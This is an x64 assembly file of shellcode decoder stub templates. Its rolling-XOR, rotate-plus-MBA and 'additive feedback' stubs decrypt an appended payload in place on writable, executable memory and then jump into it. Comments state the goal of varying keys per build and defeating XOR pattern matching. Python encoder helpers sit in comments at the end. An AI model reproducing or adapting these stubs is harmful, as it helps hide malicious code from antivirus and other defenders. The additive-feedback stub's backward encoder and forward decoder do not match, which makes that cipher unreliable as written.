; =============================================================================
; decoder-stubs.asm — NASM x64 Decoder Stub Templates
; Usage: prefix shellcode with the appropriate stub; append encoded payload.
; nasm -f bin decoder-stubs.asm -o stub.bin
; =============================================================================

BITS 64

; =============================================================================
; STUB A: ADFL (Additive Feedback Loop) Decoder
;
; Cipher: backward encode, forward decode.
;   Encode: seed=KEY; for i in reversed: ct[i] = pt[i]^seed; seed=(pt[i]+seed)%256
;   Decode: seed=KEY; for i in forward:  pt[i] = ct[i]^seed; seed=(pt[i]+seed)%256
;
; This stub is RIP-relative and self-modifying — requires W+X page.
; Replace _ADFL_KEY and _ADFL_LEN with concrete values or fill at runtime.
; =============================================================================

%define _ADFL_KEY    0x5A        ; single-byte seed — randomize per build
%define _ADFL_LEN    256         ; payload length in bytes — set at build time

section .text
global adfl_decoder
adfl_decoder:
    mov   bl, _ADFL_KEY         ; BL = running seed
    mov   rcx, _ADFL_LEN        ; RCX = loop counter
    lea   rsi, [rel adfl_payload] ; RSI -> first encrypted byte (RIP-relative)

adfl_loop:
    mov   al,  [rsi]            ; load ct[i]
    xor   al,  bl               ; pt[i] = ct[i] ^ seed
    mov   [rsi], al             ; write decrypted byte in-place (W+X required)
    add   bl,  al               ; seed = (seed + pt[i]) & 0xFF  (8-bit add wraps)
    inc   rsi
    loop  adfl_loop             ; dec rcx; jnz adfl_loop

    ; fall through OR jmp to first decoded byte:
    jmp   adfl_payload

; Payload follows immediately — fill with ADFL-encoded bytes
adfl_payload:
    times 256 db 0x00           ; placeholder — replace with actual encoded payload

; =============================================================================
; STUB B: Rolling-XOR Decoder (simple key rotation, multi-byte key)
;
; Encode: for i: ct[i] = pt[i] ^ key[i % kl]
; Decode: same operation (XOR is its own inverse)
;
; Place encoded payload immediately after this stub.
; =============================================================================

%define _RXOR_KEY_LEN   4        ; must be power of 2 for fast modulo via AND
%define _RXOR_LEN       256

global rxor_decoder
rxor_decoder:
    lea   rsi, [rel rxor_payload]
    lea   rdi, [rel rxor_key]
    mov   rcx, _RXOR_LEN
    xor   rbx, rbx               ; key index

rxor_loop:
    mov   al,  [rsi]
    mov   dl,  [rdi + rbx]       ; key[i % kl]
    xor   al,  dl
    mov   [rsi], al
    inc   rsi
    inc   rbx
    and   bl,  (_RXOR_KEY_LEN - 1)  ; fast modulo: bl = bl & (kl-1)
    loop  rxor_loop

    jmp   rxor_payload

rxor_key:
    db  0xDE, 0xAD, 0xBE, 0xEF  ; replace with random key per build

rxor_payload:
    times 256 db 0x00            ; placeholder — replace with encoded payload

; =============================================================================
; STUB C: MBA-XOR Decoder with ROR-3 layer
;
; Encode: ct[i] = ror3(pt[i] ^ key[i & (kl-1)])  where ror3 = ror by 3 bits
; Decode: pt[i] = rol3(ct[i]) ^ key[i & (kl-1)]
;
; MB expression for XOR replacement (optional — defeats simple XOR pattern match):
;   ct ^ key  is encoded as: (ct + key) - 2*(ct & key)
; =============================================================================

%define _MBA_KEY_LEN    4
%define _MBA_LEN        256

global mba_xor_decoder
mba_xor_decoder:
    lea   rsi, [rel mba_payload]
    lea   rdi, [rel mba_key]
    mov   rcx, _MBA_LEN
    xor   rbx, rbx

mba_loop:
    movzx eax, byte [rsi]        ; load ct byte
    ; ROL3: rotate left 3 bits on 8-bit value
    mov   edx, eax
    shl   edx, 3
    shr   eax, 5
    or    eax, edx
    and   eax, 0xFF              ; keep low 8 bits = ROL3(ct)

    movzx edx, byte [rdi + rbx] ; key byte
    ; MBA XOR: (a + b) - 2*(a & b)
    mov   r8d, eax
    add   r8d, edx               ; a + b
    and   eax, edx               ; a & b
    shl   eax, 1                 ; 2*(a & b)
    sub   r8d, eax               ; (a+b) - 2*(a&b) = pt
    and   r8d, 0xFF

    mov   [rsi], r8b             ; write plaintext
    inc   rsi
    inc   rbx
    and   bl, (_MBA_KEY_LEN - 1)
    loop  mba_loop

    jmp   mba_payload

mba_key:
    db  0x13, 0x37, 0x42, 0x69  ; replace with random key per build

mba_payload:
    times 256 db 0x00            ; placeholder — replace with encoded payload

; =============================================================================
; HELPER: encode_adfl (Python pseudocode — implement offline at build time)
;
; def encode_adfl(pt: bytes, key: int) -> bytes:
;     ct = bytearray(len(pt))
;     seed = key
;     for i in range(len(pt) - 1, -1, -1):
;         ct[i] = pt[i] ^ seed
;         seed = (pt[i] + seed) & 0xFF
;     return bytes(ct)
;
; HELPER: encode_rxor
;
; def encode_rxor(pt: bytes, key: bytes) -> bytes:
;     return bytes(b ^ key[i % len(key)] for i, b in enumerate(pt))
;
; HELPER: encode_mba_xor (with ror3)
;
; def ror3(b): return ((b >> 3) | (b << 5)) & 0xFF
; def mba_xor(a, b): return (a + b - 2*(a & b)) & 0xFF
; def encode_mba(pt: bytes, key: bytes) -> bytes:
;     return bytes(ror3(mba_xor(b, key[i % len(key)])) for i, b in enumerate(pt))
; =============================================================================
